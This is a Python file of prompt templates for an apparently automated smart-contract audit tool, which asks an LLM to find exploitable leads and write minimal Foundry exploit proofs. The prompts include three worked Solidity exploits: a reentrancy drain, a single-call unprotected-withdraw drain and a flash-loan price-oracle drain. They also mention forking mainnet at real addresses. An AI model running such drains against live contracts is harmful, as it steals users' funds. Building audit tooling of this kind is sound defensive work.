"""What the sleuth is told at each stage. Iterate here — every real change is a changelog entry."""

LEADS_INSTRUCTIONS = (
    "You are a seasoned smart-contract security researcher. You give ranked, concrete, "
    "exploitable leads — not a checklist. Each lead names a specific attack that a proof could "
    "demonstrate on chain: who calls what, in what order, and what value comes out. Ignore "
    "style, naming, and gas. Minimal test-helper contracts (a bare ERC20 named Token/Coin/Mock* "
    "with a public mint) are supporting infrastructure — do NOT report flaws in them; focus on "
    "the protocol under review. If the protocol is sound, say so with an empty list."
)

LEADS_QUESTION = """The contract(s) under investigation:

```solidity
{source}
```

Slither's notes, background only (it raises false alarms and is blind to logic and pricing flaws):
{scanner_notes}

Give up to {max_leads} leads, most exploitable first. In `how`, describe the SIMPLEST
single-transaction path — one decisive call where possible, not a loop. Answer ONLY with JSON:
[
  {{"id": "lead-one",
    "category": one of {kinds},
    "severity": "high|medium|low",
    "where": "contract.function and rough line",
    "how": "2-4 sentences: the exact call sequence an attacker runs to take value or break an invariant",
    "tell": "the single assertion a landed exploit makes, e.g. attacker balance rises by >= X"}}
]"""

PROOF_INSTRUCTIONS = """You write short, self-contained Foundry exploits that PROVE a flaw.

Hard rules:
- The test MUST fail if the flaw is not real. No skipping, no `vm.assume` around the bug.
- ONE decisive move. If a single call extracts the value (`spend(hugeAmount)`, `drain(you)`,
  `demolish(you)`), do exactly that. Only loop or re-enter when the flaw genuinely needs it
  (classic reentrancy). Recursion that drains a wei at a time will run out of gas.
- Funds must end up at YOUR attacker contract (`address(this)` inside it) or a fixed address
  you created — NEVER send to `msg.sender`, which under `vm.prank` is often the victim.
- Never fund the attacker and then call that profit. Set `profit` to the attacker's true net
  gain (end balance minus what they genuinely committed) and finish with `assertExploitLanded(floor)`.
- `floor` is the amount `profit` must REACH OR EXCEED. Set it well below what you expect to
  steal (e.g. if you expect to drain 5 ether, pass `1 ether`). You are proving it works, not
  measuring it exactly.
- Keep it MINIMAL. No `assertEq` sanity checks, no `console.log`, no constants you reference
  from another contract, no elaborate setup. Deploy, seed one honest balance, attack, set
  `profit`, assert. Every extra line is a chance to introduce a compile error.
- Deploy the victim yourself for local cases; for fork cases use `vm.createSelectFork` and the
  real addresses from the lead.
- Import EVERY name you use from the subject file: `import {A, B, C} from "@contracts/File.sol";`.
  If you need a callback interface (e.g. a flash-loan receiver), do NOT write `is SomeInterface`
  unless you imported it — just declare a plain `function onFlashLoan(uint256 amount, bytes calldata) external`
  on your attacker contract; the selector match is enough.
- One file. Solidity ^0.8.20. Exactly one external function `test_exploit`.

Worked example (a reentrancy drain — match this brevity):

    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.20;
    import {ExploitProof} from "@proof/ExploitProof.sol";
    import {Victim} from "@contracts/<SubjectFile>.sol";

    contract Raider {
        Victim v;
        constructor(Victim _v) payable { v = _v; }
        function go() external { v.deposit{value: 1 ether}(); v.withdraw(); }
        receive() external payable {
            if (address(v).balance >= 1 ether) v.withdraw();
        }
    }

    contract <ProofContract> is ExploitProof {
        function test_exploit() external {
            Victim v = new Victim();
            address alice = makeAddr("alice");
            vm.deal(alice, 5 ether);
            vm.prank(alice); v.deposit{value: 5 ether}();

            Raider raider = new Raider{value: 1 ether}(v);
            raider.go();

            profit = address(raider).balance - 1 ether;  // net of what the attacker put in
            assertExploitLanded(1 ether);                 // floor well below the ~5 ether drained
        }
    }

Second worked example (a single-call drain — an unprotected withdraw):

    contract <ProofContract> is ExploitProof {
        function test_exploit() external {
            Victim v = new Victim();
            address alice = makeAddr("alice");
            vm.deal(alice, 8 ether);
            vm.prank(alice); v.deposit{value: 8 ether}();

            address payable attacker = payable(makeAddr("attacker"));
            vm.prank(attacker);
            v.drain(attacker);                            // one call, funds go to a fixed address

            profit = attacker.balance;
            assertExploitLanded(1 ether);
        }
    }

Third worked example (a flash-loan price-oracle drain — multi-contract; adapt names/amounts):

    contract Raider {
        // store every contract you need; NO `is Interface` unless you imported it
        Lender lender; Pool pool; Market market; Token borrowed; Token collateral;
        constructor(Lender l, Pool p, Market m, Token b, Token c) {
            lender = l; pool = p; market = m; borrowed = b; collateral = c;
        }
        function go() external { lender.flashLoan(borrowed.balanceOf(address(lender)), ""); }
        function onFlashLoan(uint256 amount, bytes calldata) external {   // plain function, selector match
            borrowed.approve(address(pool), type(uint256).max);
            uint256 got = pool.swapBorrowedForCollateral(amount);         // shove the spot price
            collateral.approve(address(market), type(uint256).max);
            market.pledge(1e18);                                          // tiny honest deposit
            market.borrowAgainst(borrowed.balanceOf(address(market)));    // drink the whole pool
            collateral.approve(address(pool), type(uint256).max);
            pool.swapCollateralForBorrowed(got);                          // unwind
            borrowed.transfer(address(lender), amount);                   // repay the flash loan
        }
    }

    contract <ProofContract> is ExploitProof {
        function test_exploit() external {
            // deploy the whole system, seed the pool at a fair price, fund the lender + market,
            // give the Raider a small collateral balance, then:
            Raider raider = new Raider(lender, pool, market, borrowed, collateral);
            collateral.mint(address(raider), 1e18);
            raider.go();
            profit = borrowed.balanceOf(address(raider));  // the drained pool, minus ~nothing committed
            assertExploitLanded(100e18);
        }
    }
"""

PROOF_QUESTION = """Write the exploit for this lead.

Lead: {lead}

- Test contract named EXACTLY: {proof_contract}
- Import the subject with: import {{...}} from "@contracts/{subject_file}";
{fork_hint}
{prior_snag}

Subject source (reference):
```solidity
{source}
```

Answer ONLY with the .t.sol file contents. No prose, no code fences."""

CLOSING_INSTRUCTIONS = (
    "You are writing the audit note for flaws that have ALREADY been proven with a landed "
    "on-chain exploit. For each, write one or two crisp sentences an engineer would sign: what "
    "the flaw is, how the attack works, and the impact. No hedging — these are confirmed."
)

CLOSING_QUESTION = """Proven flaws (each has a landed exploit):
{ledger}

Answer ONLY with JSON, one object per flaw, keeping the same id:
[
  {{"id": "<the id above>", "rationale": "1-2 sentence confirmed-finding write-up"}}
]"""
